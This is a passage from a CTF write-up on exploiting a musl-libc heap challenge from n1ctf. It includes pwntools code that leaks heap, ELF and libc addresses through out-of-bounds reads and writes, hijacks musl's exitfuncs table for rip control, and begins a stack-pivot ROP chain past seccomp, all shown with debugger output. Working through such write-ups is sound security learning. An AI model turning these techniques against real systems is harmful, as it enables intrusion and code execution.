+<p>I allocated chunks in different ways for hours, trying to find a situation, in which a libc or address from the challenge might be somewhere behind it, so we could read it via the oob read, but no luck…</p>
+
+<p>At some point, I got desparate and thought: Ok, screw it, with ASLR active, <code class="language-plaintext highlighter-rouge">heap</code> and <code class="language-plaintext highlighter-rouge">bss</code> address will “only” differ by 2 bytes, maybe give bruteforcing a try…</p>
+
+<p>But, well yeah…. Bruteforcing two bytes will take wayyyy too long remote (every try took 10 seconds, so it might have finished in a week or so).</p>
+
+<p>But thinking about bruteforcing lead me to another idea. Remember, that the <code class="language-plaintext highlighter-rouge">read</code> in option 3 will not segfault when reading into an unmapped region? Yep, we can totally use this, to create a “heap offset finder” :)</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">test_off</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">off</span><span class="p">):</span>
+    <span class="n">set_size</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">off</span><span class="p">)</span>
+    <span class="n">set_cursize</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span>
+    <span class="n">set_size</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">off</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">prepare</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s">"failed"</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+    <span class="k">return</span> <span class="bp">True</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span>
+
+    <span class="n">summon</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
+
+    <span class="c1"># Find a valid offset to start of heap
+</span>    <span class="n">HEAP_OFF</span> <span class="o">=</span> <span class="mh">0x1060</span><span class="o">+</span><span class="mi">8</span>
+
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Test: %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">HEAP_OFF</span><span class="p">))</span>
+        <span class="n">found</span> <span class="o">=</span> <span class="n">test_off</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">HEAP_OFF</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">found</span><span class="p">:</span>
+            <span class="k">break</span>
+
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
+            <span class="n">HEAP_OFF</span> <span class="o">+=</span> <span class="mh">0x1000</span>
+
+    <span class="n">HEAP_OFF</span> <span class="o">-=</span> <span class="mh">0x8</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"HEAP offset: %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">HEAP_OFF</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  vmmap
+[ Legend:  Code | Heap | Stack ]
+Start              End                Offset             Perm Path
+0x0000562f10f4a000 0x0000562f10f4b000 0x0000000000000000 r-- /home/kileak/ctf/n1ctf/tataru/pwn
+0x0000562f10f4b000 0x0000562f10f4c000 0x0000000000001000 r-x /home/kileak/ctf/n1ctf/tataru/pwn
+0x0000562f10f4c000 0x0000562f10f4d000 0x0000000000002000 r-- /home/kileak/ctf/n1ctf/tataru/pwn
+0x0000562f10f4d000 0x0000562f10f4e000 0x0000000000002000 r-- /home/kileak/ctf/n1ctf/tataru/pwn
+0x0000562f10f4e000 0x0000562f10f4f000 0x0000000000003000 rw- /home/kileak/ctf/n1ctf/tataru/pwn
+0x0000562f128f7000 0x0000562f128f8000 0x0000000000000000 --- [heap]
+0x0000562f128f8000 0x0000562f128f9000 0x0000000000000000 rw- [heap]
+
+gef➤  x/30gx 0x0000562f10f4e000
+0x562f10f4e000:	0x0000562f10f4e000	0x0000000000000000
+0x562f10f4e010:	0x0000000000000000	0x0000000000000000
+0x562f10f4e020:	0x0000000000000000	0x0000000000000000
+0x562f10f4e030:	0x0000000000000000	0x0000000000000000
+0x562f10f4e040:	0x0000562f10f4efa0	0x0000000000000030 &lt;= buffer
+0x562f10f4e050:	0x0000000000000001	0x0000000000000000
+0x562f10f4e060:	0x0000000000000000	0x0000000000000000
+0x562f10f4e070:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>First we align the offset to the end of bss (<code class="language-plaintext highlighter-rouge">0x0000562f10f4efa0 + 0x1060 = 0x562f10f50000</code>).</p>
+
+<p>Then we’ll just try to read from that offset. If it fails, we’ll add <code class="language-plaintext highlighter-rouge">0x1000</code> to the offset and try again, until the <code class="language-plaintext highlighter-rouge">read</code> succeeds. As soon as <code class="language-plaintext highlighter-rouge">read</code> doesn’t fail, we will have hit the start of <code class="language-plaintext highlighter-rouge">heap</code> and by this know the offset from the current buffer to <code class="language-plaintext highlighter-rouge">heap</code>.</p>
+
+<p>The reason I added another 8 byte to the offset is, that we don’t want to write into the first qword on the heap, because there will be a <code class="language-plaintext highlighter-rouge">canary</code>, which <code class="language-plaintext highlighter-rouge">musl</code> uses to validate its arena regions. So, our first valid write will write to <code class="language-plaintext highlighter-rouge">heap+0x8</code>, which is totally fine.</p>
+
+<p>As soon as we know the offset to the heap, we can calculate elf base with our previous heap leak.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">BSS</span> <span class="o">=</span> <span class="n">HEAP</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">-</span> <span class="n">HEAP_OFF</span> <span class="o">-</span> <span class="mh">0xf90</span> <span class="o">-</span> <span class="mh">0x18</span>
+<span class="n">ELF</span> <span class="o">=</span> <span class="n">BSS</span> <span class="o">-</span> <span class="mh">0x4000</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"BSS             : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">BSS</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ELF             : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ELF</span><span class="p">))</span>	</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] Test: 0x15a6068
+[*] Test: 0x15a7068
+[*] Test: 0x15a8068
+[*] Test: 0x15a9068
+[*] HEAP offset: 0x15a9060
+[*] HEAP leak       : 0x55a3c9ff50b8
+[*] HEAP base       : 0x55a3c9ff5000
+[*] BSS             : 0x55a3c8a4b000
+[*] ELF             : 0x55a3c8a47000</code></pre></figure>
+
+<p>Depending on ASLR, finding the offset can take a <em>long</em> time and I already feared, that this approach would be blocked by a timeout remote, but as it turned out, it worked totally fine (the dockerfile, that was released later, also showed, that the challenge had a 30 minute timeout).</p>
+
+<p>So, armed with a heap and elf leak, we can now finally calculate the needed offset to overwrite stuff on the heap with our relative oob write.</p>
+
+<p>Since I still didn’t want to dig deeper into <code class="language-plaintext highlighter-rouge">musl</code>, I went on with “dynamic analysis” &gt;;)</p>
+
+<p>I allocated some chunks (size <code class="language-plaintext highlighter-rouge">0x30</code>) and checked where they got allocated. Then I restarted the exploit and paused it, before the chunk would get allocated and searched the heap for an address around the address, where the next chunk will be stored and then used the oob write to write another address to it before.</p>
+
+<p>Doing this, I found, that the next arena would be created at the address stored at <code class="language-plaintext highlighter-rouge">0x55555555a118</code>. So, let’s overwrite it with a pointer to <code class="language-plaintext highlighter-rouge">bss</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># 0x55555555a118 =&gt; allocation of next arena
+</span><span class="n">BUFFER</span> <span class="o">=</span> <span class="n">BSS</span> <span class="o">+</span> <span class="mh">0xcb0</span>
+<span class="n">OFFSET</span> <span class="o">=</span> <span class="p">(</span><span class="n">HEAP</span> <span class="o">+</span> <span class="mh">0x118</span><span class="p">)</span> <span class="o">-</span> <span class="n">BUFFER</span>
+
+<span class="c1"># overwrite next free chunk address with pointer to bss	
+</span><span class="n">set_size</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">OFFSET</span><span class="p">)</span>
+<span class="n">set_cursize</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">set_size</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">OFFSET</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
+
+<span class="n">prepare</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x55555555a108
+0x55555555a108:	0x000055555555a040	0x000055555555a040
+0x55555555a118:	0x0000555555558010	0x0000000100000000 &lt;= next arena allocation
+0x55555555a128:	0x00000000000004c0	0x0000000000000000
+0x55555555a138:	0x0000000000000000	0x00007ffff7ffec40
+0x55555555a148:	0x0000000000000000	0x00000000000003c0</code></pre></figure>
+
+<p>After this, the next allocated chunk would overlap our <code class="language-plaintext highlighter-rouge">ENTRIES</code> table, so we can write arbitrary pointers into it.</p>
+
+<p>I pointed slot 0 to the entry table itself, and slot 1 to <code class="language-plaintext highlighter-rouge">read.got</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># overwrite entries table to prepare libc leak	
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span> <span class="o">+</span> <span class="mh">0x40</span><span class="o">-</span> <span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>   <span class="c1"># 0 -&gt; point to entry table itself
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ELF</span> <span class="o">+</span> <span class="mh">0x3fb0</span><span class="p">)</span>         <span class="c1"># 1 -&gt; point to read got
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="c1"># next allocation will overwrite entry table
+</span><span class="n">summon</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># read read.got from pet 1 buffer
+</span><span class="n">LIBCLEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">LIBC</span> <span class="o">=</span> <span class="n">LIBCLEAK</span> <span class="o">-</span> <span class="mh">0x74f10</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBCLEAK</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC            : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBC</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x0000555555558000
+0x555555558000:	0x0000555555558000	0x0000000000000000
+0x555555558010:	0x0000000000000000	0x0000c00000000000
+0x555555558020:	0x000055555555a220	0x0000c00000000001
+0x555555558030:	0x000055555555a1f8	0x0000a00000000006
+0x555555558040:	0x0000555555558010	0x0000000000001000 &lt;= slot 0 buffer / slot 0 size
+0x555555558050:	0x0000000000000030	0x0000555555557fb0 &lt;= slot 0 offset / slot 1 buffer (read.got)
+0x555555558060:	0x0000000000000100	0x0000000000000000 &lt;= slot 1 size / slot 0 offset
+0x555555558070:	0x0000000000000000	0x000000000000000c</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] Test: 0x1068
+[*] HEAP offset: 0x1060
+[*] HEAP leak       : 0x55555555a0b8
+[*] HEAP base       : 0x55555555a000
+[*] BSS             : 0x555555558000
+[*] ELF             : 0x555555554000
+[*] LIBC leak       : 0x7ffff7fbbf10
+[*] LIBC            : 0x7ffff7f47000</code></pre></figure>
+
+<p>Since the first pet buffer points to the entry table itself, we can use it to overwrite the entry table again.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># overwrite entries table
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span> <span class="o">+</span> <span class="mh">0x100</span> <span class="o">-</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>  <span class="c1"># 0 -&gt; point to helper buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">)</span>           <span class="c1"># 1 -&gt; point to entry table
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="c1"># overwrite entry table
+</span><span class="n">prepare</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>At this point, I prepared a “helper buffer” which can be accessed via slot 0. This will be needed later in the exploit. Will skip this for now, but we’ll get back to this.</p>
+
+<p>Let’s first think about how we can achieve <code class="language-plaintext highlighter-rouge">rip</code> control. We don’t have a stack leak, and due to the checks in the binary, I’m not sure, if it’s even possible to get one, so we cannot put a ropchain on the stack and return to it.</p>
+
+<p>I thought, <code class="language-plaintext highlighter-rouge">musl</code> might also be using some kind of <code class="language-plaintext highlighter-rouge">exitfuncs</code>, so I debugged through the code of <code class="language-plaintext highlighter-rouge">exit</code> and indeed it does. We can easily trigger <code class="language-plaintext highlighter-rouge">exit</code> by pointing a chunk to somewhere in or behind libc and access it (though it was bugging us the whole time, now it comes to our rescue).</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"> ---------------------------------------------------------------------------------------------
+   0x7ffff7f666ad                  push   rbp
+   0x7ffff7f666ae                  push   rbx
+   0x7ffff7f666af                  call   0x7ffff7fb2480
+ → 0x7ffff7f666b4                  mov    rdx, QWORD PTR [rip+0x9768d]        # 0x7ffff7ffdd48
+   0x7ffff7f666bb                  test   rdx, rdx
+   0x7ffff7f666be                  je     0x7ffff7f66760
+   0x7ffff7f666c4                  mov    ecx, DWORD PTR [rip+0x9789a]        # 0x7ffff7ffdf64
+   0x7ffff7f666ca                  lea    eax, [rcx-0x1]
+   0x7ffff7f666cd                  mov    DWORD PTR [rip+0x97891], eax        # 0x7ffff7ffdf64</code></pre></figure>
+
+<p>At <code class="language-plaintext highlighter-rouge">0x7ffff7f666b4</code> it will read the address of the <code class="language-plaintext highlighter-rouge">exitfuncs</code> table from <code class="language-plaintext highlighter-rouge">0x7ffff7ffdd48</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">---------------------------------------------------------------------------------------------
+   0x7ffff7f666b4                  mov    rdx, QWORD PTR [rip+0x9768d]        # 0x7ffff7ffdd48
+   0x7ffff7f666bb                  test   rdx, rdx
+   0x7ffff7f666be                  je     0x7ffff7f66760
+ → 0x7ffff7f666c4                  mov    ecx, DWORD PTR [rip+0x9789a]        # 0x7ffff7ffdf64
+   0x7ffff7f666ca                  lea    eax, [rcx-0x1]
+   0x7ffff7f666cd                  mov    DWORD PTR [rip+0x97891], eax        # 0x7ffff7ffdf64
+   0x7ffff7f666d3                  test   ecx, ecx
+   0x7ffff7f666d5                  jle    0x7ffff7f6672e
+   0x7ffff7f666d7                  nop    WORD PTR [rax+rax*1+0x0]</code></pre></figure>
+
+<p>At <code class="language-plaintext highlighter-rouge">0x7ffff7f666c4</code> it will read the count of entries from <code class="language-plaintext highlighter-rouge">0x7ffff7ffdf64</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">---------------------------------------------------------------------------------------------
+   0x7ffff7f666e7                  nop    WORD PTR [rax+rax*1+0x0]
+   0x7ffff7f666f0                  cdqe   
+   0x7ffff7f666f2                  mov    rdi, rbx
+ → 0x7ffff7f666f5                  mov    r12, QWORD PTR [rdx+rax*8+0x108]
+   0x7ffff7f666fd                  mov    rbp, QWORD PTR [rdx+rax*8+0x8]
+   0x7ffff7f66702                  call   0x7ffff7fb2570
+   0x7ffff7f66707                  mov    rdi, r12
+   0x7ffff7f6670a                  call   rbp
+   0x7ffff7f6670c                  mov    rdi, rbx</code></pre></figure>
+
+<p>If we set entry count to <code class="language-plaintext highlighter-rouge">1</code>, <code class="language-plaintext highlighter-rouge">rax</code> will now be <code class="language-plaintext highlighter-rouge">0</code> and <code class="language-plaintext highlighter-rouge">r12</code> will be read from <code class="language-plaintext highlighter-rouge">[rdx+0x108]</code> (which will be moved to <code class="language-plaintext highlighter-rouge">rdi</code> at <code class="language-plaintext highlighter-rouge">0x7ffff7f66707</code>). 
+We can use this to set the argument for the <code class="language-plaintext highlighter-rouge">function</code> that will be called.</p>
+
+<p>At <code class="language-plaintext highlighter-rouge">0x7ffff7f666fd</code> <code class="language-plaintext highlighter-rouge">rbp</code> will be set to <code class="language-plaintext highlighter-rouge">[rdx+8]</code> and will then be called.</p>
+
+<p>So to get an arbitrary call, we need to</p>
+
+<ul>
+  <li>Write the address of a fake <code class="language-plaintext highlighter-rouge">exitfunc table</code> to <code class="language-plaintext highlighter-rouge">0x7ffff7ffdd48</code></li>
+  <li>Write <code class="language-plaintext highlighter-rouge">0x1</code> (for <code class="language-plaintext highlighter-rouge">rcx</code>) to <code class="language-plaintext highlighter-rouge">0x7ffff7ffdf64</code></li>
+  <li>Write the address of the gadget we want to call into our fake <code class="language-plaintext highlighter-rouge">exitfunc table</code></li>
+  <li>Write the argument (<code class="language-plaintext highlighter-rouge">rdi</code>) for our gadget into fake exitunc table <code class="language-plaintext highlighter-rouge">+0x108</code></li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># 0x55555555a050 has next free target address
+</span><span class="n">BUFFER</span> <span class="o">=</span> <span class="n">BSS</span> <span class="o">+</span> <span class="mh">0x40</span>
+<span class="n">OFFSET</span> <span class="o">=</span> <span class="p">(</span><span class="n">HEAP</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">)</span> <span class="o">-</span> <span class="n">BUFFER</span>
+
+<span class="n">set_size</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">OFFSET</span><span class="p">)</span>
+<span class="n">set_cursize</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">set_size</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">OFFSET</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
+
+<span class="c1"># overwrite next free arena address to point near exitfuncs address
+</span><span class="n">prepare</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0xb6d10</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x48</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span><span class="o">+</span><span class="mh">0x100</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>        <span class="c1"># point to helper buffer
+</span>
+<span class="n">summon</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x130</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span>                <span class="c1"># count for exitfuncs (rcx)
+</span>
+<span class="n">summon</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x130</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>This will point the <code class="language-plaintext highlighter-rouge">exitfunc</code> table address to our previously created helper buffer and the second allocation will overwrite <code class="language-plaintext highlighter-rouge">0x7ffff7ffdf64</code> with <code class="language-plaintext highlighter-rouge">0x1</code>, setting <code class="language-plaintext highlighter-rouge">rcx</code> to the correct value.</p>
+
+<p>So, we need now to go back to the allocation of our helper buffer and prepare our fake <code class="language-plaintext highlighter-rouge">exitfunc</code> table there.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># write fake exitfunc table to BSS + 0x100
+</span><span class="n">prepare</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>       <span class="c1"># rip
+</span>
+<span class="c1"># overwrite entry table again
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span> <span class="o">+</span> <span class="mh">0x200</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">prepare</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># write exitfunc argument to BSS + 0x200
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>         <span class="c1"># rdi</span></code></pre></figure>
+
+<p>Let’s check <code class="language-plaintext highlighter-rouge">exit</code> again.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x00007ffff7f6670a in ?? () from /lib/ld-musl-x86_64.so.1
+───────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x41414141        
+$rbx   : 0x00007ffff7ffdf60  →  0x0000000041414141 ("AAAA"?)
+$rcx   : 0x1               
+$rdx   : 0x00005555555580f8  →  0x0000000000000000
+$rsp   : 0x00007fffffffdaf0  →  0x0000555555556250  →  0xfffff170fffff1c0
+$rbp   : 0xdeadbeef        
+$rsi   : 0x0000555555556229  →  0x002172656b636168 ("hacker!"?)
+$rdi   : 0xcafebabe        
+$rip   : 0x00007ffff7f6670a  →   call rbp
+$r8    : 0x0               
+$r9    : 0x0               
+$r10   : 0x0               
+$r11   : 0x246             
+$r12   : 0xcafebabe        
+$r13   : 0x0000555555558040  →  0x00007ffff7ffdd00  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$r14   : 0x0000555555558040  →  0x00007ffff7ffdd00  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$r15   : 0x130             
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7ffff7f666fd                  mov    rbp, QWORD PTR [rdx+rax*8+0x8]
+   0x7ffff7f66702                  call   0x7ffff7fb2570
+   0x7ffff7f66707                  mov    rdi, r12
+ → 0x7ffff7f6670a                  call   rbp
+   0x7ffff7f6670c                  mov    rdi, rbx
+   0x7ffff7f6670f                  call   0x7ffff7fb2480
+   0x7ffff7f66714                  mov    edx, DWORD PTR [rip+0x9784a]        # 0x7ffff7ffdf64
+   0x7ffff7f6671a                  lea    eax, [rdx-0x1]
+   0x7ffff7f6671d                  test   edx, edx
+───────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffdaf0│+0x0000: 0x0000555555556250  →  0xfffff170fffff1c0	 ← $rsp
+0x00007fffffffdaf8│+0x0008: 0x0000000000000000
+0x00007fffffffdb00│+0x0010: 0x0000555555556219  →  0x726f6d206f6e003a (":"?)
+0x00007fffffffdb08│+0x0018: 0x00007ffff7f5c09c  →  &lt;exit+12&gt; call 0x7ffff7fbf5e0
+0x00007fffffffdb10│+0x0020: 0x00007fffffffdb48  →  0x0000000000000100
+0x00007fffffffdb18│+0x0028: 0x0000555555555517  →   imul r14, r14, 0x18
+─────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
+*0xdeadbeef (
+   $rdi = 0x00000000cafebabe,
+   $rsi = 0x0000555555556229 → 0x002172656b636168 ("hacker!"?),
+   $rdx = 0x00005555555580f8 → 0x0000000000000000
+)
+────────────────────────────────────────────────────────────────────────────────────────────────────</code></pre></figure>
+
+<p>Perfect, we got rip control and even control the argument in <code class="language-plaintext highlighter-rouge">rdi</code>.</p>
+
+<p>Could be finished already, but we won’t be able to call <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> or <code class="language-plaintext highlighter-rouge">one_gadget</code> since the challenge uses <code class="language-plaintext highlighter-rouge">seccomp</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">"""
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
+ 0005: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0009
+ 0006: 0x15 0x02 0x00 0x0000009d  if (A == prctl) goto 0009
+ 0007: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0009
+ 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0009: 0x06 0x00 0x00 0x00000000  return KILL
+"""</code></pre></figure>
+
+<p>So, we will need to do a ropchain. Tried to find a gadget for pivotting the stack into some controlled area, and <code class="language-plaintext highlighter-rouge">musl libc</code> just contained a wonderful gadget to do this:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x000000000007b1f5: mov rsp, qword ptr [rdi + 0x30]; jmp qword ptr [rdi + 0x38];</code></pre></figure>
+
+<p>Since we control <code class="language-plaintext highlighter-rouge">rdi</code>, we can just put an address at <code class="language-plaintext highlighter-rouge">rdi+0x30</code> pointing to one of our buffers and put a simple <code class="language-plaintext highlighter-rouge">ret</code> gadget at <code class="language-plaintext highlighter-rouge">rdi+x038</code>. Calling this, will then pivot the stack into our buffer and continue execution there.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># 0x000000000007b1f5: mov rsp, qword ptr [rdi + 0x30]; jmp qword ptr [rdi + 0x38];
+</span><span class="n">STACKPIVOT</span> <span class="o">=</span> <span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x7b1f5</span>
+<span class="n">RET</span> <span class="o">=</span> <span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x47ed7</span>
+
+<span class="c1"># write fake exitfunc table to BSS + 0x100
+</span><span class="n">prepare</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">STACKPIVOT</span><span class="p">))</span>       <span class="c1"># rip
+</span>
+<span class="c1"># overwrite entry table again
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span> <span class="o">+</span> <span class="mh">0x200</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">BSS</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">)</span>
